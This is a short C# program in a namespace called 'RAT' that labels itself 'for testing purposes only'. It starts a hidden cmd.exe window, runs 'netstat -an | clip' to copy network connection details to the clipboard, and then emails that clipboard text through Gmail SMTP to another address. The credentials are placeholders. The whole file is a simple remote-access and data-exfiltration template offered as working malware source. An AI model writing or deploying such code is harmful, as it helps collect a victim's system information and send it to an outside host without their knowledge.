using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Net.Mail;
using System.Windows.Forms;
namespace RAT
{
    class Program
    {

        [STAThread]
        static void Main(string[] args)
        {
            ColoredConsoleWrite(ConsoleColor.Yellow, $"This is for testing purposes only");
            ColoredConsoleWrite(ConsoleColor.Gray, $"");
            ColoredConsoleWrite(ConsoleColor.Gray, $"Attempting Shell execution");
            GetInfo();
            ColoredConsoleWrite(ConsoleColor.Green, $"Shell Succesfully Executed");
            ColoredConsoleWrite(ConsoleColor.Green, $"");
            ColoredConsoleWrite(ConsoleColor.Gray, $"Sending data collected");
            SendInfo();
            ColoredConsoleWrite(ConsoleColor.Gray, $"Data Succesfully Sent");
            Console.Read();
        }
        static void GetInfo()
        {
           
            Process cmd = new Process();
            cmd.StartInfo.FileName = "cmd.exe";
            cmd.StartInfo.RedirectStandardInput = true;
            cmd.StartInfo.RedirectStandardOutput = true;
            cmd.StartInfo.CreateNoWindow = true;
            cmd.StartInfo.UseShellExecute = false;
            ColoredConsoleWrite(ConsoleColor.Gray, $"Launching Shell Execution");
            cmd.Start();
            cmd.StandardInput.WriteLine("netstat -an | clip");
            ColoredConsoleWrite(ConsoleColor.Green, $"Shell Loaded");
            cmd.StandardInput.Flush();
            cmd.StandardInput.Close();
            cmd.WaitForExit();
            Console.WriteLine(cmd.StandardOutput.ReadToEnd());
        }
        static void SendInfo()
        {
            ColoredConsoleWrite(ConsoleColor.Green, $"Collecting data");
            string clipboardData = Clipboard.GetText();
            SmtpClient client = new SmtpClient();
            ColoredConsoleWrite(ConsoleColor.Green, $"Opening Port");
            ColoredConsoleWrite(ConsoleColor.Green, $" client Port = 587");
            client.Port = 587;
            ColoredConsoleWrite(ConsoleColor.Green, $"Connecting to Client Host");
            ColoredConsoleWrite(ConsoleColor.Green, $"client Host = smtp.gmail.com");
            client.Host = "smtp.gmail.com";
            client.EnableSsl = true;
            client.Timeout = 10000;
            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;
            ColoredConsoleWrite(ConsoleColor.Green, $"Logging in");
            client.Credentials = new System.Net.NetworkCredential("Put Your email here", "and your password here");
            MailMessage mm = new MailMessage("Put your email here", "another email here", "You Got mail", clipboardData);
            mm.BodyEncoding = UTF8Encoding.UTF8;
            mm.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
            client.Send(mm);
        }
        public static void ColoredConsoleWrite(ConsoleColor color, string text)
        {
            ConsoleColor originalColor = System.Console.ForegroundColor;
            System.Console.ForegroundColor = color;
            System.Console.WriteLine(text);
            System.Console.ForegroundColor = originalColor;
        }

    }
 }


